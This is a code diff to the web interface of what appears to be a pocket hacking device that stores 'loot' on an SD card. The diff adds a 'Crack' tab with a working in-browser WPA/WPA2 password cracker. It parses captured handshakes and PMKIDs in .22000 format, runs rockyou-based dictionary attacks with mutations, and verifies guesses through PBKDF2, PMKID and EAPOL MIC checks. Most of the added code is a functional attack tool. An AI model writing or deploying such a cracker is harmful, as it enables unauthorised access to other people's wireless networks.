@@ -10,7 +10,7 @@
 body{background:var(--bg);color:var(--txt);font-family:monospace;font-size:14px;min-height:100vh}
 h1{color:var(--gold);font-size:1em;padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
 .tabs{display:flex;border-bottom:1px solid var(--border)}
-.tab{flex:1;padding:9px;text-align:center;cursor:pointer;color:var(--dim);font-size:13px}
+.tab{flex:1;padding:9px;text-align:center;cursor:pointer;color:var(--dim);font-size:12px}
 .tab.on{color:var(--gold);border-bottom:2px solid var(--gold);margin-bottom:-1px}
 .pnl{display:none;padding:12px}
 .pnl.on{display:block}
@@ -29,6 +29,15 @@ a.dl:hover{color:#fff}
 .fld:first-child{border-top:none;margin-top:0}
 .err{color:var(--red);padding:8px;font-size:13px}
 .note{color:var(--dim);font-size:11px;padding:4px 0}
+/* Crack tab */
+select{width:100%;background:var(--card);color:var(--txt);border:1px solid var(--border);padding:6px;font-family:monospace;font-size:12px;outline:none;margin-bottom:2px}
+.ck-row{display:flex;align-items:center;gap:8px;margin:6px 0;font-size:12px;cursor:pointer}
+.ck-row input[type=checkbox]{width:16px;height:16px;accent-color:var(--gold);cursor:pointer}
+.prog{background:var(--card);border:1px solid var(--border);padding:10px;margin-top:8px;font-size:12px;line-height:2}
+.prog .spd{color:var(--gold);font-size:16px;font-weight:bold}
+.prog .cur{color:var(--dim);font-size:11px;word-break:break-all;line-height:1.4;margin-top:2px}
+.found{background:#0f1f08;border:2px solid #4a8020;color:#8fdd40;padding:14px;font-size:16px;font-weight:bold;text-align:center;border-radius:4px;margin-top:8px;word-break:break-all;line-height:1.6}
+.cracking{color:var(--gold);padding:8px;font-size:13px}
 </style>
 </head>
 <body>
@@ -36,11 +45,16 @@ a.dl:hover{color:#fff}
 <div class="tabs">
   <div class="tab on" id="t0" onclick="sw(0)">&#128190; Files</div>
   <div class="tab" id="t1" onclick="sw(1)">&#128296; Decode</div>
+  <div class="tab" id="t2" onclick="sw(2)">&#128273; Crack</div>
 </div>
+
+<!-- Files -->
 <div class="pnl on" id="p0">
   <p class="note" style="padding:4px 0 8px">Files on the SD card &mdash; tap &#8615; to download to your phone.</p>
   <div id="fl"><p style="color:var(--dim);padding:8px">Loading files...</p></div>
 </div>
+
+<!-- Decode -->
 <div class="pnl" id="p1">
   <div class="lbl">Input &mdash; paste text, base64, or hex</div>
   <textarea id="inp" placeholder="Paste data here..."></textarea>
@@ -57,19 +71,74 @@ a.dl:hover{color:#fff}
   </div>
   <div id="out"></div>
 </div>
+
+<!-- Crack -->
+<div class="pnl" id="p2">
+  <div class="lbl">WPA capture (.22000)</div>
+  <select id="capSel"><option value="">-- loading captures... --</option></select>
+
+  <div class="lbl" style="margin-top:8px">Wordlist source</div>
+  <select id="wlSrc" onchange="wlChange()">
+    <option value="sd">SD: /andraste/loot/rockyou.txt (default)</option>
+    <option value="sdpath">SD: enter path manually</option>
+    <option value="upload">Upload from phone</option>
+  </select>
+  <div id="wlPathDiv" style="display:none;margin-top:4px">
+    <input id="wlPath" type="text" style="width:100%;background:var(--card);color:var(--txt);border:1px solid var(--border);padding:6px;font-family:monospace;font-size:12px;outline:none" placeholder="/andraste/loot/wordlist.txt">
+  </div>
+  <div id="wlFileDiv" style="display:none;margin-top:4px">
+    <input id="wlFile" type="file" accept=".txt" style="color:var(--dim);font-size:12px">
+  </div>
+
+  <label class="ck-row" style="margin-top:10px">
+    <input type="checkbox" id="mutate" checked>
+    <span>&#128293; Superpumped &mdash; 7&times; mutations (~100M candidates from rockyou)</span>
+  </label>
+  <label class="ck-row">
+    <input type="checkbox" id="pmkidOnly">
+    <span>PMKID only (type-01 records, fastest)</span>
+  </label>
+
+  <div style="margin-top:12px;display:flex;gap:8px">
+    <div class="btn" id="startBtn" onclick="startCrack()" style="flex:1;text-align:center;background:#0f1f08;border-color:#4a6020;color:#8fdd40;font-size:14px">&#9654; START</div>
+    <div class="btn" id="stopBtn" onclick="stopCrack()" style="flex:1;text-align:center;display:none;color:var(--red)">&#9646;&#9646; STOP</div>
+  </div>
+
+  <div id="crackInfo" class="prog" style="display:none">
+    <div class="spd" id="crackSpd">0 p/s</div>
+    <div>Tried: <b id="crackTried">0</b> &nbsp;|&nbsp; ETA: <span id="crackEta">--</span></div>
+    <div class="cur" id="crackCur"></div>
+  </div>
+  <div id="crackResult"></div>
+</div>
+
 <script>
-function sw(n){
-  [0,1].forEach(function(i){
-    document.getElementById('t'+i).className='tab'+(n===i?' on':'');
-    document.getElementById('p'+i).className='pnl'+(n===i?' on':'');
+var gWorker = null;
+
+function sw(n) {
+  [0,1,2].forEach(function(i){
+    document.getElementById('t'+i).className = 'tab'+(n===i?' on':'');
+    document.getElementById('p'+i).className = 'pnl'+(n===i?' on':'');
   });
-  if(n===0)lf();
+  if (n===0) lf();
+  if (n===2) lcap();
 }
 
 function fmt(n){
   return n<1024?n+'B':n<1048576?Math.round(n/1024)+'K':(n/1048576).toFixed(1)+'M';
 }
 
+function fmtN(n){
+  if(n<1e6) return n.toLocaleString();
+  if(n<1e9) return (n/1e6).toFixed(2)+'M';
+  return (n/1e9).toFixed(2)+'B';
+}
+
+function esc(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ---- Files tab ----
 function lf(){
   var el=document.getElementById('fl');
   el.innerHTML='<p style="color:var(--dim);padding:8px">Loading...</p>';
@@ -77,13 +146,12 @@ function lf(){
     if(!d.files||!d.files.length){el.innerHTML='<p class="err">No files found on SD card.</p>';return;}
     var grp={};
     d.files.forEach(function(f){
-      var parts=f.p.split('/');
-      var folder=parts.slice(0,parts.length-1).join('/');
+      var folder=f.p.split('/').slice(0,-1).join('/');
       if(!grp[folder])grp[folder]=[];
       grp[folder].push(f);
     });
     var h='';
-    if(d.truncated)h='<p class="note">Showing first '+d.files.length+' files.</p>';
+    if(d.truncated) h='<p class="note">Showing first '+d.files.length+' files.</p>';
     Object.keys(grp).sort().forEach(function(folder){
       h+='<div class="fld">'+folder.replace('/andraste/','')+'</div>';
       grp[folder].forEach(function(f){
@@ -102,6 +170,7 @@ function lf(){
   });
 }
 
+// ---- Decode tab ----
 function op(t){
   var v=document.getElementById('inp').value, r='';
   try{
@@ -128,13 +197,286 @@ function op(t){
 
 function cp(){
   try{navigator.clipboard.writeText(document.getElementById('out').textContent);}
-  catch(e){/* fallback: select text */
-    var sel=window.getSelection();
-    var rng=document.createRange();
+  catch(e){
+    var sel=window.getSelection(),rng=document.createRange();
     rng.selectNodeContents(document.getElementById('out'));
     sel.removeAllRanges();sel.addRange(rng);
   }
 }
+
+// ---- Crack tab ----
+function lcap(){
+  fetch('/files').then(function(r){return r.json();}).then(function(d){
+    var caps=(d.files||[]).filter(function(f){return f.p.endsWith('.22000');});
+    var sel=document.getElementById('capSel');
+    if(!caps.length){
+      sel.innerHTML='<option value="">-- no .22000 files found on SD --</option>';
+      return;
+    }
+    sel.innerHTML=caps.map(function(f){
+      var name=f.p.split('/').pop();
+      return '<option value="'+f.p+'">'+name+' ('+fmt(f.s)+')</option>';
+    }).join('');
+  }).catch(function(){});
+}
+
+function wlChange(){
+  var src=document.getElementById('wlSrc').value;
+  document.getElementById('wlPathDiv').style.display = src==='sdpath'?'block':'none';
+  document.getElementById('wlFileDiv').style.display = src==='upload'?'block':'none';
+}
+
+function stopCrack(){
+  if(gWorker){gWorker.terminate();gWorker=null;}
+  document.getElementById('startBtn').style.display='';
+  document.getElementById('stopBtn').style.display='none';
+}
+
+function parseHC22000(text){
+  var records=[];
+  text.split('\n').forEach(function(line){
+    line=line.trim();
+    if(!line||line[0]==='#') return;
+    var p=line.split('*');
+    if(p.length<9||p[0]!=='WPA') return;
+    var essidHex=p[5];
+    var ssid='';
+    for(var i=0;i<essidHex.length;i+=2)
+      ssid+=String.fromCharCode(parseInt(essidHex.substr(i,2),16));
+    records.push({type:p[1],field2:p[2],apMac:p[3],staMac:p[4],ssid:ssid,aNonce:p[6],eapol:p[7],msgPair:p[8]});
+  });
+  return records;
+}
+
+async function startCrack(){
+  var capPath=document.getElementById('capSel').value;
+  if(!capPath){alert('Select a .22000 capture first.');return;}
+
+  var resp;
+  try{resp=await fetch('/dl?f='+encodeURIComponent(capPath));}
+  catch(e){document.getElementById('crackResult').innerHTML='<div class="err">Could not fetch capture: '+esc(e.message)+'</div>';return;}
+  var text=await resp.text();
+  var records=parseHC22000(text);
+  if(!records.length){document.getElementById('crackResult').innerHTML='<div class="err">No valid WPA records in capture file.</div>';return;}
+
+  var pmkidOnly=document.getElementById('pmkidOnly').checked;
+  var targets=pmkidOnly?records.filter(function(r){return r.type==='01';}):records;
+  if(!targets.length){
+    document.getElementById('crackResult').innerHTML='<div class="err">No '+(pmkidOnly?'PMKID (type-01) ':'')+'records found.</div>';
+    return;
+  }
+
+  var wlSrc=document.getElementById('wlSrc').value;
+  var wlUrl=null, wlData=null;
+  if(wlSrc==='sd'){
+    wlUrl='/dl?f='+encodeURIComponent('/andraste/loot/rockyou.txt');
+  } else if(wlSrc==='sdpath'){
+    var p=document.getElementById('wlPath').value.trim();
+    if(!p){alert('Enter SD wordlist path.');return;}
+    wlUrl='/dl?f='+encodeURIComponent(p);
+  } else {
+    var file=document.getElementById('wlFile').files[0];
+    if(!file){alert('Select a wordlist file.');return;}
+    wlData=await file.text();
+  }
+
+  var mutate=document.getElementById('mutate').checked;
+
+  if(gWorker){gWorker.terminate();gWorker=null;}
+  document.getElementById('startBtn').style.display='none';
+  document.getElementById('stopBtn').style.display='';
+  document.getElementById('crackInfo').style.display='block';
+  document.getElementById('crackResult').innerHTML='<div class="cracking">&#9670; Cracking '+targets.length+' target'+(targets.length>1?'s':'')+' — '+esc(targets[0].ssid)+'</div>';
+
+  var blob=new Blob([crackWorkerSrc()],{type:'application/javascript'});
+  var burl=URL.createObjectURL(blob);
+  gWorker=new Worker(burl);
+  URL.revokeObjectURL(burl);
+
+  gWorker.onmessage=function(e){
+    var msg=e.data;
+    if(msg.type==='progress'){
+      document.getElementById('crackSpd').textContent=fmtN(msg.speed)+' p/s';
+      document.getElementById('crackTried').textContent=fmtN(msg.tried);
+      document.getElementById('crackEta').textContent=msg.eta;
+      document.getElementById('crackCur').textContent=msg.current;
+    } else if(msg.type==='found'){
+      stopCrack();
+      document.getElementById('crackInfo').style.display='none';
+      document.getElementById('crackResult').innerHTML=
+        '<div class="found">&#128273; PASSWORD FOUND<br><br>'
+        +esc(msg.password)
+        +'<br><br><span style="font-size:12px;color:#6fbd30">SSID: '+esc(msg.ssid)+'</span></div>';
+    } else if(msg.type==='done'){
+      stopCrack();
+      document.getElementById('crackResult').innerHTML='<div class="err">&#10007; Not found in wordlist.</div>';
+    } else if(msg.type==='error'){
+      stopCrack();
+      document.getElementById('crackResult').innerHTML='<div class="err">Worker error: '+esc(msg.msg)+'</div>';
+    }
+  };
+
+  gWorker.postMessage({targets:targets,wlUrl:wlUrl,wlData:wlData,mutate:mutate});
+}
+
+function crackWorkerSrc(){
+return `
+"use strict";
+
+var targets=[], doMutate=false, tried=0, startMs=0, found=false;
+
+function hexToBytes(h){
+  var b=new Uint8Array(h.length>>>1);
+  for(var i=0;i<b.length;i++) b[i]=parseInt(h.substr(i*2,2),16);
+  return b;
+}
+
+// Generate ~7 mutations of a base password
+function* mutations(pw){
+  yield pw;
+  var lo=pw.toLowerCase();
+  var up=pw.toUpperCase();
+  var title=lo.length?lo[0].toUpperCase()+lo.slice(1):lo;
+  if(title!==pw) yield title;
+  if(up!==pw&&up!==title) yield up;
+  var leet=lo.replace(/a/g,'4').replace(/e/g,'3').replace(/i/g,'1').replace(/o/g,'0').replace(/s/g,'5');
+  if(leet!==lo&&leet!==pw) yield leet;
+  yield pw+'1';
+  yield pw+'123';
+  yield pw+'2024';
+  yield pw+'!';
+}
+
+async function derivePMK(pw, ssid){
+  var enc=new TextEncoder();
+  var km=await crypto.subtle.importKey('raw',enc.encode(pw),'PBKDF2',false,['deriveBits']);
+  return new Uint8Array(await crypto.subtle.deriveBits(
+    {name:'PBKDF2',hash:'SHA-1',salt:enc.encode(ssid),iterations:4096},km,256));
+}
+
+async function checkPMKID(pmk, t){
+  var label=new TextEncoder().encode("PMK Name");
+  var ap=hexToBytes(t.apMac), sta=hexToBytes(t.staMac);
+  var data=new Uint8Array(label.length+12);
+  data.set(label,0); data.set(ap,label.length); data.set(sta,label.length+6);
+  var key=await crypto.subtle.importKey('raw',pmk,{name:'HMAC',hash:'SHA-1'},false,['sign']);
+  var sig=new Uint8Array(await crypto.subtle.sign('HMAC',key,data));
+  var target=hexToBytes(t.field2);
+  for(var i=0;i<16;i++) if(sig[i]!==target[i]) return false;
+  return true;
+}
+
+function cmpBytes(a,b){
+  for(var i=0;i<a.length;i++){if(a[i]<b[i])return -1;if(a[i]>b[i])return 1;}
+  return 0;
+}
+
+async function prf512(pmk,label,b){
+  var enc=new TextEncoder();
+  var la=enc.encode(label);
+  var key=await crypto.subtle.importKey('raw',pmk,{name:'HMAC',hash:'SHA-1'},false,['sign']);
+  var out=new Uint8Array(64), off=0;
+  for(var i=0;off<64;i++){
+    var d=new Uint8Array(la.length+1+b.length+1);
+    d.set(la,0); d[la.length]=0; d.set(b,la.length+1); d[la.length+1+b.length]=i;
+    var h=new Uint8Array(await crypto.subtle.sign('HMAC',key,d));
+    var n=Math.min(20,64-off); out.set(h.slice(0,n),off); off+=n;
+  }
+  return out;
+}
+
+async function checkHandshake(pmk, t){
+  var ap=hexToBytes(t.apMac), sta=hexToBytes(t.staMac);
+  var aNonce=hexToBytes(t.aNonce);
+  // SNonce at EAPOL byte offset 17 (32 bytes)
+  var sNonce=hexToBytes(t.eapol.substr(34,64));
+  var lo=cmpBytes(ap,sta)<0?ap:sta, hi=lo===ap?sta:ap;
+  var ln=cmpBytes(aNonce,sNonce)<0?aNonce:sNonce, hn=ln===aNonce?sNonce:aNonce;
+  var b=new Uint8Array(76);
+  b.set(lo,0); b.set(hi,6); b.set(ln,12); b.set(hn,44);
+  var ptk=await prf512(pmk,"Pairwise key expansion",b);
+  var kck=ptk.slice(0,16);
+  // Zero MIC field (bytes 81-96) in EAPOL frame before verifying
+  var eb=hexToBytes(t.eapol);
+  for(var i=81;i<97;i++) eb[i]=0;
+  var kckKey=await crypto.subtle.importKey('raw',kck,{name:'HMAC',hash:'SHA-1'},false,['sign']);
+  var mic=new Uint8Array(await crypto.subtle.sign('HMAC',kckKey,eb));
+  var target=hexToBytes(t.field2);
+  for(var i=0;i<16;i++) if(mic[i]!==target[i]) return false;
+  return true;
+}
+
+async function tryBatch(pws){
+  for(var pw of pws){
+    if(found) return;
+    tried++;
+    for(var t of targets){
+      var pmk=await derivePMK(pw,t.ssid);
+      var hit=(t.type==='01') ? await checkPMKID(pmk,t) : await checkHandshake(pmk,t);
+      if(hit){
+        found=true;
+        postMessage({type:'found',password:pw,ssid:t.ssid});
+        return;
+      }
+    }
+    if(tried%200===0){
+      var elapsed=(Date.now()-startMs)/1000||1;
+      var spd=Math.round(tried/elapsed);
+      var etaSec=spd>0?Math.round((14000000*(doMutate?7:1)-tried)/spd):0;
+      var eta=etaSec>3600?(etaSec/3600).toFixed(1)+'h':etaSec>60?Math.round(etaSec/60)+'min':etaSec+'s';
+      postMessage({type:'progress',tried:tried,speed:spd,eta:eta,current:pw.length>40?pw.substr(0,40)+'...':pw});
+    }
+  }
+}
+
+async function* streamLines(url){
+  var r=await fetch(url);
+  var reader=r.body.getReader();
+  var dec=new TextDecoder();
+  var buf='';
+  while(true){
+    var chunk=await reader.read();
+    if(chunk.done) break;
+    buf+=dec.decode(chunk.value,{stream:true});
+    var lines=buf.split('\\n');
+    buf=lines.pop();
+    for(var l of lines){l=l.trim();if(l) yield l;}
+  }
+  if(buf.trim()) yield buf.trim();
+}
+
+self.onmessage=async function(e){
+  targets=e.data.targets;
+  doMutate=e.data.mutate;
+  startMs=Date.now();
+  found=false; tried=0;
+  var batch=[], BATCH=400;
+
+  var add=async function(pw){
+    if(doMutate){for(var m of mutations(pw)) batch.push(m);}
+    else batch.push(pw);
+    if(batch.length>=BATCH){var b=batch;batch=[];await tryBatch(b);}
+  };
+
+  try{
+    if(e.data.wlData){
+      for(var line of e.data.wlData.split('\\n')){
+        if(found) break;
+        line=line.trim(); if(line) await add(line);
+      }
+    } else {
+      for await(var line of streamLines(e.data.wlUrl)){
+        if(found) break;
+        await add(line);
+      }
+    }
+    if(batch.length&&!found) await tryBatch(batch);
+    if(!found) postMessage({type:'done'});
+  } catch(err){
+    postMessage({type:'error',msg:String(err)});
+  }
+};
+`;}
 
 lf();
 </script>
